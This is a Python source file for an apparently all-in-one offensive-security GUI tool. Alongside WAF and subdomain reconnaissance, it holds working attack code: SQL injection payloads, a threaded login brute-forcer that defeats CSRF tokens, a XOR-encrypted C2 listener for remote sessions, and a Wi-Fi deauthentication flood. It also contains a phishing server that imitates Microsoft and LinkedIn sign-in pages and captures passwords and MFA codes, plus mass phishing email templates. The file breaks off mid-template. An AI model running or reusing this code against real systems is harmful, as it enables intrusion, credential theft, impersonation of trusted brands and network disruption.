import asyncio
import base64
import json
import math
import re
import random
import socket
import ssl
import subprocess
import sys
import threading
import time
import platform
from concurrent.futures import ThreadPoolExecutor
from dataclasses import asdict, dataclass
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional
from urllib.parse import urljoin, urlparse

import qtawesome as qta  # type: ignore[reportMissingImports]
import requests  # type: ignore[reportMissingImports]
import urllib3  # type: ignore[reportMissingImports]
import yaml  # type: ignore[reportMissingImports]
import websockets  # type: ignore[reportMissingImports]
from bs4 import BeautifulSoup  # type: ignore[reportMissingImports]

# Recon & Exploit Libraries
try:
    import shodan
    import pyshark
    from pwn import *
except ImportError:
    pass

# PySide6 Imports
from PySide6.QtCore import (  # type: ignore[reportMissingImports]
    QEasingCurve,
    QObject,
    QPoint,
    QPropertyAnimation,
    QRect,
    QRectF,
    QSize,
    Qt,
    QThread,
    QTimer,
    Signal,
    Slot,
)
from PySide6.QtGui import (  # type: ignore[reportMissingImports]
    QAction,
    QBrush,
    QColor,
    QFont,
    QFontDatabase,
    QIcon,
    QLinearGradient,
    QPainter,
    QPainterPath,
    QPalette,
    QPen,
    QRadialGradient,
)
from PySide6.QtWidgets import (  # type: ignore[reportMissingImports]
    QApplication,
    QDialog,
    QFileDialog,
    QFrame,
    QGraphicsDropShadowEffect,
    QGridLayout,
    QHBoxLayout,
    QHeaderView,
    QLabel,
    QLineEdit,
    QMainWindow,
    QMessageBox,
    QProgressBar,
    QPushButton,
    QScrollArea,
    QSizePolicy,
    QStackedWidget,
    QTabBar,
    QComboBox,
    QTableWidget,
    QTableWidgetItem,
    QTextEdit,
    QVBoxLayout,
    QWidget,
)

from core.recon.waf import WafDetector
from core.recon.subdomain import SubdomainScanner
from modules.web.sqli import SQLiEngine
from modules.web.brute import BruteForceEngine
from modules.intruder.c2 import CommandHandlerEngine
from modules.intruder.wifi import WiFiEngine
from modules.intruder.bluetooth import BluetoothEngine
from modules.intruder.phish import CredentialHarvester
from intel.manager import IntelManager

# Pack Engine Imports (Discovery via Registry-style patterns)
from engines.intruder.stalk import StalkEngine
from engines.intruder.cctv_cam import CCTVCamEngine
from engines.intruder.crackmapexec import CrackMapExecEngine
from engines.intruder.xsstrike import XSStrikeEngine
from engines.intruder.httpie_engine import HTTPieEngine
from engines.intruder.photon_engine import PhotonEngine
from engines.recon.shodan import ShodanEngine
from engines.recon.domain import DomainEngine as SubdomainScannerEngine
from engines.recon.nmap_engine import NmapEngine
from engines.system.settings_engine import SettingsEngine as SystemSettingsEngine
from engines.recon.libdnet_engine import LibdnetEngine
from engines.recon.dpkt_engine import DpktEngine
from engines.recon.bloodhound_engine import BloodHoundEngine
from engines.recon.spoodle_engine import SpoodleEngine
from engines.intruder.habu_engine import HabuEngine
from engines.intruder.dirsearch_engine import DirsearchEngine
from engines.intruder.selenium_engine import SeleniumEngine
from engines.intruder.packet_engine import PacketEngine

from theme import OBSIDIAN_PRO_COLORS as AETHER_COLORS, get_qss

def to_qcolor(hex_str, alpha=255):
    c = QColor(hex_str)
    c.setAlpha(alpha)
    return c

STYLING = get_qss()

# ==================== DATA MODELS ====================


class ScanMode(Enum):
    WEB = "WEB"
    NETWORK = "NETWORK"
    SYSTEM = "SYSTEM"
    FULL = "FULL"

class Severity(Enum):
    CRITICAL = 4
    HIGH = 3
    MEDIUM = 2
    LOW = 1
    INFO = 0

    def color(self):
        colors = {
            Severity.CRITICAL: AETHER_COLORS["accent_error"],
            Severity.HIGH:     AETHER_COLORS["accent_error"],
            Severity.MEDIUM:   AETHER_COLORS["accent_warning"],
            Severity.LOW:      AETHER_COLORS["accent_success"],
            Severity.INFO:     AETHER_COLORS["accent_info"],
        }
        return colors.get(self, AETHER_COLORS["text_sec"])


@dataclass
class Vulnerability:
    id: str
    title: str
    description: str
    severity: Severity
    category: str
    target: str
    evidence: str = ""
    remediation: str = ""
    cvss_score: float = 0.0
    cve_ids: List[str] = None
    cwe_id: str = ""
    references: List[str] = None
    discovered_at: str = None
    template_id: str = ""

    def __post_init__(self):
        if self.discovered_at is None:
            self.discovered_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if self.cve_ids is None:
            self.cve_ids = []
        if self.references is None:
            self.references = []


# ==================== HELPERS ====================

import logging
import re as _re

_log = logging.getLogger("omnivuln")
logging.basicConfig(level=logging.WARNING, format="%(name)s %(levelname)s: %(message)s")

def _validate_url(url: str) -> str:
    """Normalize and loosely validate a URL. Returns the URL or raises ValueError."""
    url = url.strip()
    if not url:
        raise ValueError("Empty URL")
    if not url.startswith(("http://", "https://")):
        url = f"http://{url}"
    parsed = urlparse(url)
    if not parsed.hostname:
        raise ValueError(f"Invalid URL (no host): {url}")
    return url

def _validate_target(target: str) -> str:
    """Validate an IP or hostname string."""
    target = target.strip()
    if not target:
        raise ValueError("Empty target")
    return target

def _resilient_session(retries: int = 2, backoff: float = 0.3) -> requests.Session:
    """Create a requests.Session with retry logic."""
    from urllib3.util.retry import Retry
    from requests.adapters import HTTPAdapter
    s = requests.Session()
    retry = Retry(total=retries, backoff_factor=backoff, status_forcelist=[502, 503, 504])
    adapter = HTTPAdapter(max_retries=retry)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    s.headers["User-Agent"] = "Mozilla/5.0 (compatible; OmniVulnScanner/4.0)"
    return s

# ==================== ADVANCED SCANNING ENGINES ====================
class WafDetector:
    """Professional WAF/CDN Fingerprinter with 20+ signature sets"""
    SIGNATURES = {
        "Cloudflare":    ["cloudflare", "cf-ray", "__cfduid", "server: cloudflare"],
        "Akamai":        ["akamai", "akamaighost", "x-check-cacheable"],
        "Sucuri":        ["sucuri", "x-sucuri-id", "x-sucuri-cache"],
        "Imperva":       ["imperva", "incapsula", "visid_incap", "x-iinfo"],
        "AWS-WAF":       ["awselb", "x-amz-cf-id", "aws"],
        "ModSecurity":   ["mod_security", "modsecurity", "x-modsecurity"],
        "Barracuda":     ["barra_counter_scope", "barracuda_"],
        "F5-BIG-IP":     ["bigipserver", "f5", "ts01"],
        "Fortinet":      ["fortigate", "fortiweb"],
        "Citrix":        ["ns_af", "citrix"],
        "Wallarm":       ["wallarm"],
        "Radware":       ["x-denied-reason", "x-sid"],
        "Nginx-WAF":     ["naxsi", "x-page-speed"],
        "DenyAll":       ["denyall", "sessioncookie"],
        "Reblaze":       ["x-reblaze-protection", "rbzid"],
    }

    def detect(self, target: str, callback=None):
        try:
            base_url = _validate_url(target)
        except ValueError as e:
            if callback: callback(f"[WAF] Invalid target: {e}", AETHER_COLORS["accent_error"])
            return None
        detected = []
        try:
            sess = _resilient_session()
            r = sess.get(base_url, timeout=6, verify=False)
            all_headers = str(r.headers).lower()
            body_lower  = r.text.lower()

            for waf, sigs in self.SIGNATURES.items():
                if any(sig in all_headers or sig in body_lower for sig in sigs):
                    detected.append(waf)
                    if callback: callback(f"[WAF] Detected: {waf}", AETHER_COLORS["accent_error"])

            # Provoke block
            provoke = f"{base_url}/?exec=/etc/passwd&XDEBUG_SESSION_START=1&sql=' OR 1=1--"
            r2 = sess.get(provoke, timeout=6, verify=False)
            if r2.status_code in [403, 406, 429, 501]:
                if not detected:
                    detected.append("GENERIC_BLOCK")
                if callback: callback(f"[WAF] Provocation blocked ({r2.status_code}): Generic WAF active", AETHER_COLORS["accent_warning"])

        except requests.ConnectionError as e:
            if callback: callback(f"[WAF] Connection failed: {e}", AETHER_COLORS["accent_error"])
            _log.warning("WAF detect connection error: %s", e)
        except requests.Timeout:
            if callback: callback("[WAF] Request timed out.", AETHER_COLORS["accent_warning"])
        except Exception as e:
            if callback: callback(f"[WAF] Error: {e}", AETHER_COLORS["accent_error"])
            _log.exception("WAF detect unexpected error")
        return detected or None


class SubdomainScanner:
    """Multi-source Subdomain Enumerator: crt.sh + HackerTarget + DNS brute"""
    COMMON_SUBS = [
        "www","mail","ftp","localhost","webmail","smtp","pop","ns1","ns2",
        "webdisk","admin","forum","vpn","api","dev","staging","test","app",
        "m","mobile","portal","dashboard","backend","cdn","static","assets",
        "blog","wiki","help","support","shop","store","status","monitor",
    ]

    def scan(self, domain: str, callback=None) -> List[str]:
        subdomains = set()

        # Source 1: crt.sh Certificate Transparency
        try:
            r = requests.get(f"https://crt.sh/?q={domain}&output=json", timeout=12)
            if r.ok:
                for entry in r.json():
                    for name in entry["name_value"].split("\n"):
                        name = name.strip().lower().lstrip("*.").rstrip(".")
                        if name.endswith(domain) and name not in subdomains:
                            subdomains.add(name)
                            if callback: callback(f"[CT] {name}")
        except requests.RequestException as e:
            _log.debug("crt.sh lookup failed: %s", e)
            if callback: callback(f"[SUBD] crt.sh unavailable.", AETHER_COLORS["accent_warning"])

        # Source 2: HackerTarget API
        try:
            r2 = requests.get(f"https://api.hackertarget.com/hostsearch/?q={domain}", timeout=10)
            if r2.ok and "error" not in r2.text.lower():
                for line in r2.text.strip().splitlines():
                    host = line.split(",")[0].strip().lower()
                    if host.endswith(domain) and host not in subdomains:
                        subdomains.add(host)
                        if callback: callback(f"[HT] {host}")
        except requests.RequestException as e:
            _log.debug("HackerTarget lookup failed: %s", e)
            if callback: callback(f"[SUBD] HackerTarget unavailable.", AETHER_COLORS["accent_warning"])

        # Source 3: DNS Brute
        def _resolve(sub):
            fqdn = f"{sub}.{domain}"
            try:
                socket.gethostbyname(fqdn)
                return fqdn
            except socket.gaierror:
                return None

        with ThreadPoolExecutor(max_workers=30) as ex:
            for res in ex.map(_resolve, self.COMMON_SUBS):
                if res and res not in subdomains:
                    subdomains.add(res)
                    if callback: callback(f"[DNS] {res}", AETHER_COLORS["accent_gold"])

        if callback: callback(f"[SUBD] Total: {len(subdomains)} subdomains found.", AETHER_COLORS["accent_cyan"])
        return sorted(subdomains)


class CorsScanner:
    """Professional CORS Misconfiguration Auditor with 6 test origins"""
    TEST_ORIGINS = [
        "https://evil-attacker.com",
        "https://attacker.co.uk",
        "null",
        f"http://evil.{'{domain}'}" ,
    ]

    def audit(self, url: str, callback=None) -> Optional[Vulnerability]:
        try:
            url = _validate_url(url)
        except ValueError as e:
            if callback: callback(f"[CORS] Invalid URL: {e}", AETHER_COLORS["accent_error"])
            return None
        for origin in ["https://evil-attacker.com", "null", "https://attacker.co.uk"]:
            try:
                r = requests.get(url, headers={"Origin": origin}, timeout=6, verify=False)
                acao = r.headers.get("Access-Control-Allow-Origin", "")
                acac = r.headers.get("Access-Control-Allow-Credentials", "").lower()
                acam = r.headers.get("Access-Control-Allow-Methods", "")

                if acao in (origin, "*") or (acao and acac == "true"):
                    sev  = Severity.CRITICAL if acac == "true" else Severity.HIGH
                    desc = (f"Server reflects injected Origin '{acao}' "
                            f"[Credentials: {acac}] [Methods: {acam}]")
                    if callback: callback(f"[CORS] VULNERABLE: {desc}", AETHER_COLORS["accent_error"])
                    return Vulnerability(
                        id="CORS-MISCONFIG", title="Permissive CORS Policy",
                        description=desc, severity=sev, category="web", target=url,
                        evidence=f"ACAO: {acao} | ACAC: {acac}",
                        remediation="Whitelist only trusted origins. Never use '*' with credentials."
                    )
            except requests.RequestException as e:
                _log.debug("CORS check failed for origin %s: %s", origin, e)
        if callback: callback("[CORS] No misconfiguration detected.", AETHER_COLORS["accent_success"])
        return None


class SQLiEngine:
    """Linux-grade SQL Injection Suite: Error, Boolean, Union, Time-based"""

    # DB-specific error fingerprints
    DB_ERRORS = {
        "MySQL":      ["You have an error in your SQL syntax", "mysql_fetch_array", "mysqli_fetch", "Warning: mysql"],
        "PostgreSQL": ["pg_query()", "PSQLException", "ERROR:  syntax error", "pg_exec()"],
        "MSSQL":      ["Unclosed quotation mark", "SqlException", "Microsoft OLE DB Provider", "Incorrect syntax near"],
        "Oracle":     ["ORA-01756", "ORA-00933", "ORA-00907", "quoted string not properly terminated"],
        "SQLite":     ["SQLite3::QueryExecutionException", "unrecognized token", "sqlite_compile_error"],
    }

    # Comprehensive payload list per technique
    ERROR_PAYLOADS = [
        "'", '"', "')", "'--", "' OR '1'='1", "' OR 1=1--", "' OR 'x'='x",
        "\" OR \"1\"=\"1", "admin'--", "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    ]
    TIME_PAYLOADS = [
        ("MySQL",   "' AND SLEEP(5)--"),
        ("MySQL",   "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"),
        ("MSSQL",   "'; WAITFOR DELAY '0:0:5'--"),
        ("MSSQL",   "1; WAITFOR DELAY '0:0:5'--"),
        ("Postgres","' OR 1=1; SELECT pg_sleep(5)--"),
        ("Postgres","'); SELECT pg_sleep(5)--"),
    ]
    UNION_COLS = range(1, 11)  # test 1-10 columns

    def scan(self, url: str, callback=None) -> List[Vulnerability]:
        from urllib.parse import parse_qs, urlparse, urlencode, urlunparse
        try:
            url = _validate_url(url)
        except ValueError as e:
            if callback: callback(f"[SQLi] Invalid URL: {e}", AETHER_COLORS["accent_error"])
            return []
        findings = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            if callback: callback("[SQLi] No GET params found. Provide URL like: http://site.com/page?id=1")
            return []

        sess = requests.Session()
        sess.headers["User-Agent"] = "Mozilla/5.0 (compatible; sqlninja/0.3)"

        def _build_url(p, v):
            q = {k: v[0] for k, v in params.items()}
            q[p] = v
            return urlunparse(parsed._replace(query=urlencode(q)))

        def _fetch(u, timeout=8):
            try:
                return sess.get(u, timeout=timeout, verify=False)
            except requests.RequestException:
                return None

        for param in params:
            base_url = _build_url(param, params[param][0])
            base_r = _fetch(base_url)
            if not base_r: continue
            base_len = len(base_r.text)
            if callback: callback(f"[SQLi] Testing param: {param} | Baseline: {base_len}B")

            # 1 ─ ERROR-BASED
            for pay in self.ERROR_PAYLOADS:
                r = _fetch(_build_url(param, pay))
                if not r: continue
                for db, sigs in self.DB_ERRORS.items():
                    if any(s in r.text for s in sigs):
                        msg = f"[SQLi][ERROR/{db}] '{param}' → {pay}"
                        if callback: callback(msg, AETHER_COLORS["accent_error"])
                        findings.append(Vulnerability(
                            id=f"SQLI-ERROR-{db}", title=f"Error-Based SQLi ({db})",
                            description=f"DB error exposed via param '{param}' with payload: {pay}",
                            severity=Severity.CRITICAL, category="web",
                            target=_build_url(param, pay), evidence=r.text[:200]
                        ))
                        break

            # 2 ─ BOOLEAN-BASED BLIND
            r_true  = _fetch(_build_url(param, f"{params[param][0]}' AND 1=1--"))
            r_false = _fetch(_build_url(param, f"{params[param][0]}' AND 1=2--"))
            if r_true and r_false:
                diff = abs(len(r_true.text) - len(r_false.text))
                if diff > 5 or (r_true.status_code != r_false.status_code):
                    msg = f"[SQLi][BOOLEAN] '{param}' → differential {diff}B / status {r_true.status_code} vs {r_false.status_code}"
                    if callback: callback(msg, AETHER_COLORS["accent_error"])
                    findings.append(Vulnerability(
                        id="SQLI-BOOLEAN", title="Boolean-Based Blind SQLi",
                        description=f"Differential response {diff}B on param '{param}' (AND 1=1 vs AND 1=2)",
                        severity=Severity.CRITICAL, category="web",
                        target=base_url, evidence=f"Δ={diff}B"
                    ))

            # 3 ─ UNION-BASED COLUMN ENUMERATION
            for n in self.UNION_COLS:
                nulls = ",".join(["NULL"] * n)
                pay = f"' UNION SELECT {nulls}--"
                r = _fetch(_build_url(param, pay))
                if r and "error" not in r.text.lower() and r.status_code == 200:
                    msg = f"[SQLi][UNION] '{param}' → {n} column(s) confirmed"
                    if callback: callback(msg, AETHER_COLORS["accent_error"])
                    findings.append(Vulnerability(
                        id="SQLI-UNION", title=f"Union-Based SQLi ({n} cols)",
                        description=f"UNION SELECT with {n} NULLs returned 200 on '{param}'",
                        severity=Severity.CRITICAL, category="web",
                        target=_build_url(param, pay)
                    ))
                    break

            # 4 ─ TIME-BASED BLIND
            for db_label, pay in self.TIME_PAYLOADS:
                start = time.time()
                _fetch(_build_url(param, pay), timeout=12)
                elapsed = time.time() - start
                if elapsed >= 4.5:
                    msg = f"[SQLi][TIME/{db_label}] '{param}' → delay {elapsed:.1f}s"
                    if callback: callback(msg, AETHER_COLORS["accent_error"])
                    findings.append(Vulnerability(
                        id=f"SQLI-TIME-{db_label}", title=f"Time-Based Blind SQLi ({db_label})",
                        description=f"Server paused {elapsed:.1f}s on '{param}' via: {pay}",
                        severity=Severity.CRITICAL, category="web",
                        target=_build_url(param, pay), evidence=f"delay={elapsed:.1f}s"
                    ))
                    break

        if not findings and callback:
            callback("[SQLi] No injection points detected.", AETHER_COLORS["accent_success"])
        return findings

class BruteForceEngine:
    """Professional Multi-threaded Brute Forcer with CSRF/Session Support"""
    def __init__(self):
        self.stop_flag = False
        self.session = requests.Session()
        self.ua_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
        ]

    def _get_csrf(self, url):
        try:
            r = self.session.get(url, timeout=5, verify=False)
            soup = BeautifulSoup(r.text, 'html.parser')
            for tag in soup.find_all('input'):
                if 'csrf' in tag.get('name', '').lower() or 'token' in tag.get('name', '').lower():
                    return tag.get('name'), tag.get('value')
        except requests.RequestException as e:
            _log.debug("CSRF fetch failed: %s", e)
        return None, None

    def brute_http_form(self, url, user_field, pass_field, user, wordlist, failure_msg="Login failed", callback=None, threads=10):
        self.stop_flag = False
        if not Path(wordlist).exists(): return None
        
        csrf_name, csrf_val = self._get_csrf(url)
        if csrf_name and callback: callback(f"Detected CSRF Token: {csrf_name}")

        def _attempt(passwd):
            if self.stop_flag: return None
            try:
                passwd = passwd.strip()
                data = {user_field: user, pass_field: passwd}
                if csrf_name: data[csrf_name] = csrf_val
                
                headers = {"User-Agent": random.choice(self.ua_list)}
                r = self.session.post(url, data=data, headers=headers, timeout=5, verify=False)
                
                if failure_msg not in r.text and r.status_code != 401:
                    self.stop_flag = True
                    return passwd
            except requests.RequestException:
                pass
            return None

        with open(wordlist, "r") as f: passwords = f.readlines()
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for res in executor.map(_attempt, passwords):
                if res:
                    if callback: callback(f"[SUCCESS] Credentials Found: {user}:{res}", AETHER_COLORS["accent_blue"])
                    return res
        return None

class CommandHandlerEngine(threading.Thread):
    """Professional Multi-Session Asynchronous C2 Listener with XOR Encryption"""
    def __init__(self, port, callback=None):
        super().__init__(daemon=True)
        self.port = port
        self.callback = callback
        self.server = None
        self.sessions = [] 
        self.key = b"OMNI_XOR_KEY_2024"

    def _xor(self, data):
        return bytes([b ^ self.key[i % len(self.key)] for i, b in enumerate(data)])

    def run(self):
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server.bind(("0.0.0.0", self.port))
            self.server.listen(10)
            if self.callback: self.callback(f"[C2] Listener active on :{self.port}")
            
            while True:
                client, addr = self.server.accept()
                sid = len(self.sessions)
                self.sessions.append({"socket": client, "addr": addr, "active": True})
                if self.callback: self.callback(f"[C2] Session {sid} established: {addr[0]}", AETHER_COLORS["accent_blue"])
                
                def _io_loop(c, s_id):
                    while True:
                        try:
                            raw = c.recv(8192)
                            if not raw: break
                            dec = self._xor(raw).decode(errors='ignore').strip()
                            if self.callback: self.callback(f"[SID {s_id}] << {dec}")
                        except (OSError, ConnectionError):
                            break
                    self.sessions[s_id]["active"] = False
                    if self.callback: self.callback(f"[C2] Session {s_id} disconnected.")

                threading.Thread(target=_io_loop, args=(client, sid), daemon=True).start()
        except Exception as e:
            if self.callback: self.callback(f"[C2] Fatal: {e}", AETHER_COLORS["accent_error"])
        finally:
            if self.server: self.server.close()

    def send_cmd(self, cmd, sid=0):
        if sid < len(self.sessions) and self.sessions[sid]["active"]:
            try:
                enc = self._xor(f"{cmd}\n".encode())
                self.sessions[sid]["socket"].send(enc)
                return True
            except (OSError, BrokenPipeError) as e:
                _log.debug("C2 send_cmd failed for SID %d: %s", sid, e)
        return False

class WiFiEngine:
    """Industrial Wireless Assessment Engine with Multi-Platform Fallback"""
    def __init__(self):
        self.aps = []

    def scan_aps(self, interface="wlan0", callback=None, duration=10):
        if not interface or not isinstance(interface, str):
            if callback: callback("[WIFI] Invalid interface.", AETHER_COLORS["accent_error"])
            return
        # Professional fallback: If scapy/monitor fails, use OS native tools
        if platform.system() == "Windows":
            if callback: callback("[WIFI] Monitor mode unavailable. Using netsh fallback...", AETHER_COLORS["accent_warning"])
            try:
                out = subprocess.check_output("netsh wlan show networks mode=bssid", shell=True).decode()
                if callback: callback("[WIFI] Network data captured via netsh.")
            except subprocess.CalledProcessError as e:
                if callback: callback(f"[WIFI] netsh failed: {e}", AETHER_COLORS["accent_error"])
            except FileNotFoundError:
                if callback: callback("[WIFI] netsh not found.", AETHER_COLORS["accent_error"])
        
        try:
            from scapy.all import sniff, Dot11Beacon, Dot11, Dot11Elt
            if callback: callback(f"[WIFI] Passive capture on {interface}...")
            
            def _pkt_callback(pkt):
                if pkt.haslayer(Dot11Beacon):
                    bssid = pkt[Dot11].addr2
                    ssid = pkt[Dot11Elt].info.decode(errors='ignore') if pkt[Dot11Elt].info else "HIDDEN"
                    if not any(a['bssid'] == bssid for a in self.aps):
                        self.aps.append({'ssid': ssid, 'bssid': bssid})
                        if callback: callback(f"[WIFI] AP: {ssid} [{bssid}]")

            sniff(iface=interface, prn=_pkt_callback, timeout=duration, store=0)
        except Exception as e:
            if callback: callback(f"[WIFI] Error: {e}", AETHER_COLORS["accent_error"])

    def deauth(self, target_mac, gateway_mac, interface="wlan0", callback=None):
        if not _re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', target_mac or ''):
            if callback: callback("[WIFI] Invalid target MAC format.", AETHER_COLORS["accent_error"])
            return
        if not _re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', gateway_mac or ''):
            if callback: callback("[WIFI] Invalid gateway MAC format.", AETHER_COLORS["accent_error"])
            return
        try:
            from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
            pkt = RadioTap()/Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)/Dot11Deauth()
            if callback: callback(f"[WIFI] Deauth flood on {target_mac}...", AETHER_COLORS["accent_error"])
            sendp(pkt, iface=interface, count=500, inter=0.05, verbose=False)
            if callback: callback("[WIFI] Deauth sequence complete.")
        except Exception as e:
            if callback: callback(f"[WIFI] Fatal: {e}", AETHER_COLORS["accent_error"])


class BluetoothEngine(threading.Thread):
    """Persistent Bluetooth Device Scanner using PyBluez with friendly-name resolution."""

    def __init__(self, callback=None, interval=5, max_cycles=0):
        """
        interval  – seconds between each inquiry (default 5s, 0 = as fast as possible)
        max_cycles – stop after N scans (0 = run forever until stop() called)
        """
        super().__init__(daemon=True)
        self.callback   = callback
        self.interval   = interval
        self.max_cycles = max_cycles
        self._stop_flag = threading.Event()
        self.seen       = {}     # mac -> name  (deduplication & cache)

    # ------------------------------------------------------------------ helpers
    def _log(self, msg, color=None):
        if self.callback:
            self.callback(msg, color or AETHER_COLORS["accent_cyan"])

    def stop(self):
        self._stop_flag.set()

    # ------------------------------------------------------------------ discovery
    def run(self):
        self._log("[BT] Scanner disabled (driver stability issue).", AETHER_COLORS["accent_warning"])
        # Logic commented out to prevent unending processes
        """
        cycle = 0
        while not self._stop_flag.is_set():
            cycle += 1
            self._scan_once()
            if self.max_cycles and cycle >= self.max_cycles:
                break
            self._stop_flag.wait(self.interval)
        """

    def _scan_once(self):
        # Bluetooth discovery disabled to prevent terminal-level hangs
        pass

    # ------------------------------------------------------------------ lookup
    @staticmethod
    def lookup_name(mac: str) -> str:
        """Convert a MAC address to a user-friendly device name."""
        try:
            import bluetooth
            name = bluetooth.lookup_name(mac, timeout=5)
            return name or "<unknown>"
        except Exception:
            return "<lookup failed>"


class CredentialHarvester:
    """Professional Credential Collection Engine (MFA, Geo-IP, High-Fidelity Templates)"""
    def __init__(self):
        self.captured = []
        self.templates = {
            "Microsoft_Modern": """<html><body style='background:#f2f2f2; font-family:"Segoe UI",sans-serif;'><div style='width:400px; margin:100px auto; background:white; padding:44px; box-shadow:0 2px 4px rgba(0,0,0,.1);'><img src='https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg'/><h2 style='font-size:24px; color:#1b1b1b;'>Sign in</h2><form method='POST'><input name='user' placeholder='Email, phone, or Skype' style='width:100%; padding:8px; margin:10px 0; border:none; border-bottom:1px solid #0067b8;'/><br><input name='pass' type='password' placeholder='Password' style='width:100%; padding:8px; margin:10px 0; border:none; border-bottom:1px solid #0067b8;'/><br><div style='margin-top:20px;'><input type='submit' value='Next' style='background:#0067b8; color:white; border:none; padding:8px 32px; cursor:pointer;'/></div></form></div></body></html>""",
            "MFA_Phase": """<html><body style='background:#f2f2f2; font-family:sans-serif;'><div style='width:400px; margin:100px auto; background:white; padding:40px;'><img src='https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg'/><h3>Verify your identity</h3><p>Enter the code displayed in your authenticator app.</p><form method='POST'><input name='mfa_code' placeholder='Code' style='width:100px; padding:8px;'/><input type='submit' value='Verify' style='margin-left:10px;'/></form></div></body></html>""",
            "LinkedIn": """<html><body style='background:#f3f2ef; font-family:sans-serif;'><div style='width:350px; margin:50px auto; background:white; padding:20px; border-radius:8px;'><h2 style='color:#0a66c2;'>LinkedIn</h2><form method='POST'><input name='user' placeholder='Email or Phone' style='width:100%; margin:5px 0; padding:10px;'/><br><input name='pass' type='password' placeholder='Password' style='width:100%; margin:5px 0; padding:10px;'/><br><input type='submit' value='Sign in' style='width:100%; background:#0a66c2; color:white; border:none; padding:10px; font-weight:bold;'/></form></div></body></html>"""
        }

    def start_local_harvester(self, port=8080, template_name="Microsoft_Modern", callback=None):
        from http.server import BaseHTTPRequestHandler, HTTPServer
        
        class HarvesterHandler(BaseHTTPRequestHandler):
            def _log_intel(self, data):
                ip = self.client_address[0]
                ua = self.headers.get('User-Agent', 'Hidden')
                ts = time.strftime('%H:%M:%S')
                intel = f"[{ts}] IP:{ip} | INTELLIGENCE: {data} | UA:{ua}"
                if callback: callback(intel, AETHER_COLORS["accent_error"])

            def do_GET(self):
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                content = CredentialHarvester().templates.get(template_name, CredentialHarvester().templates["Microsoft_Modern"])
                self.wfile.write(content.encode())

            def do_POST(self):
                length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(length).decode()
                self._log_intel(post_data)
                
                # Switch to MFA phase if not already there
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(CredentialHarvester().templates["MFA_Phase"].encode())

            def log_message(self, format, *args): return

        server = HTTPServer(('0.0.0.0', port), HarvesterHandler)
        if callback: callback(f"[PHISH] Harvester active on :{port} | Template: {template_name}", AETHER_COLORS["accent_info"])
        threading.Thread(target=server.serve_forever, daemon=True).start()

class EmailPhisher:
    """Mass Social Engineering Engine – smtplib Gmail/SMTP Automated Phisher"""

    # --------------------------------------------------------------- templates
    TEMPLATES = {
        "IT-Support": {
            "subject": "[IT Support] Action Required – Password Expiry Notice",
            "html": """
<html><body style='font-family:Arial,sans-serif;font-size:14px;'>
<div style='max-width:600px;margin:auto;border:1px solid #ddd;padding:30px;'>
<img src='https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/512px-Microsoft_logo.svg.png' width='100'/>
<h2 style='color:#0078D4;'>IT Security Team – Password Reset Required</h2>
<p>Dear <b>{name}</b>,</p>
<p>Our security audit has detected that your account password will <b>expire in 24 hours</b>.
To avoid being locked out of your account, please click the button below to reset your password immediately.</p>
<p style='text-align:center;'>
  <a href='{phish_url}' style='background:#0078D4;color:white;padding:12px 30px;text-decoration:none;border-radius:4px;font-weight:bold;'>Reset Password Now</a>
</p>
<p>If you did not request this change, please contact IT Support at ext. 1337.</p>
<hr/>
<p style='font-size:11px;color:#888;'>IT Security Department | {company} | This is an automated message.</p>
</div></body></html>"""
        },
        "Invoice": {
            "subject": "Invoice #{invoice_id} – Payment Confirmation Required",
            "html": """
<html><body style='font-family:Arial,sans-serif;font-size:14px;'>
<div style='max-width:600px;margin:auto;border:1px solid #ddd;padding:30px;'>
<h2 style='color:#d32f2f;'>Payment Required – Invoice #{invoice_id}</h2>
<p>Dear <b>{name}</b>,</p>
<p>Please find attached your invoice #{invoice_id} for the amount of <b>${amount}</b>.
This payment is due by {due_date}. Failure to pay may result in service interruption.</p>
<p style='text-align:center;'>
  <a href='{phish_url}' style='background:#d32f2f;color:white;padding:12px 30px;text-decoration:none;border-radius:4px;'>View &amp; Pay Invoice</a>
</p>
<p style='font-size:11px;color:#888;'>Finance Department | {company}</p>
</div></body></html>"""
        },
        "Account-Suspended": {
            "subject": "Urgent: Your Account Has Been Temporarily Suspended",
            "html": """
<html><body style='font-family:Arial,sans-serif;font-size:14px;'>
<div style='max-width:600px;margin:auto;background:#fff;border-top:4px solid #FF6600;padding:30px;'>
<h2 style='color:#FF6600;'>⚠ Account Suspension Notice</h2>
<p>Dear <b>{name}</b>,</p>
<p>We have detected <b>unusual activity</b> associated with your account at <b>{company}</b>.
For your security, we have temporarily suspended your account access.</p>
<p>To restore access, please verify your identity within <b>12 hours</b>:</p>
<p style='text-align:center;'>
  <a href='{phish_url}' style='background:#FF6600;color:white;padding:12px 30px;text-decoration:none;border-radius:4px;font-weight:bold;'>Verify My Account</a>
</p>
